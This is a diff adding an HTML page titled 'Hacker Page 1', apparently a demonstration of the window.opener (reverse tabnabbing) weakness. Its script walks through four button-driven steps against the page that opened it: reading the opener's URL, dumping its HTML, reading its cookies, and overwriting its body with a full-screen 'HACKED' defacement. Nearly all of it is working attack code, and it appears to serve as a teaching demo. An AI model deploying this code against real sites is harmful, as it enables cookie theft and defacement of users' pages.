@@ -1,0 +1,115 @@
+<html>
+    <head>
+        <title>Hacker Page 1</title>
+        <style>
+            body {
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                text-align: center;
+                align-items: center;
+                background-color: deepskyblue;
+                font-family: sans-serif;
+            }
+
+            .hack-button {
+                -webkit-appearance: none;
+                background: white;
+                border: 0;
+                padding: 16px 32px;
+                border-radius: 4px;
+                cursor: pointer;
+                font-size: 24px;
+            }
+
+            .parent-hacked-container,
+            .parent-content-container,
+            .parent-url-container {
+                padding: 20px 40px;
+                color: black;
+                background: rgba(255,255,255,.5);
+                margin-bottom: 40px;
+            }
+            
+            code {
+                padding: 4px;
+                display: block;
+                background: white;
+            }
+
+
+        </style>
+    </head>
+    <body>
+        <div class="hack-content"></div>
+        <button class="hack-button">Get Parent Url</button>
+        <script>
+
+            const hackContentContainer = document.querySelector('.hack-content');
+            const hackButton = document.querySelector('.hack-button');
+
+            let hackIndex = 0;
+
+            hackButton.addEventListener("click", function() {
+                if(hackIndex === 0) {
+                    getParentUrl();
+                    hackButton.innerHTML = 'Get HTML';
+                }
+                else if(hackIndex === 1) {
+                    getParentHtml();
+                    hackButton.innerHTML = 'Get Cookies';
+                }
+                else if(hackIndex === 2) {
+                    getCookies();
+                    hackButton.innerHTML = 'Change Content';
+                }
+                else if(hackIndex === 3) {
+                    changeContent();
+                    hackButton.remove()
+                }
+                hackIndex=hackIndex+1;
+            });
+
+            function getParentUrl() {                
+                const command = document.createElement('code');
+                command.innerHTML = 'window.opener.location.href';
+                hackContentContainer.appendChild(command);
+                const hackResultContainer = document.createElement('div');
+                hackResultContainer.classList = 'parent-url-container';
+                hackResultContainer.innerHTML = window.opener.location.href;
+                hackContentContainer.appendChild(hackResultContainer);
+            }
+
+            function getParentHtml() {   
+                const command = document.createElement('code');
+                command.innerHTML = 'window.opener.document.body.innerHTML';
+                hackContentContainer.appendChild(command);             
+                const hackResultContainer = document.createElement('div');
+                hackResultContainer.classList = 'parent-content-container';
+                hackResultContainer.textContent = window.opener.document.body.innerHTML;
+                hackContentContainer.appendChild(hackResultContainer);
+            }
+
+            function getCookies() {      
+                const command = document.createElement('code');
+                command.innerHTML = 'window.opener.document.cookie';
+                hackContentContainer.appendChild(command);          
+                const hackResultContainer = document.createElement('div');
+                hackResultContainer.classList = 'parent-content-container';
+                hackResultContainer.textContent = window.opener.document.cookie;
+                hackContentContainer.appendChild(hackResultContainer);
+            }
+
+            function changeContent() {   
+                const command = document.createElement('code');
+                command.innerHTML = 'window.opener.document.body.innerHTML = "Bad Content"';
+                hackContentContainer.appendChild(command);             
+                const hackResultContainer = document.createElement('div');
+                hackResultContainer.classList = 'parent-hacked-container';
+                window.opener.document.body.innerHTML = '<div style="position: fixed; background: #cc0000; height: 100%; width: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center;color: white;"><h1>HACKED</h1><img src="https://media.giphy.com/media/PPi5c8l8WDY7if1L8z/giphy.gif"></div>';
+                hackResultContainer.innerHTML = '<p>Hacked!</p>'
+                hackContentContainer.appendChild(hackResultContainer);
+            }
+        </script>
+    </body>
+</html>
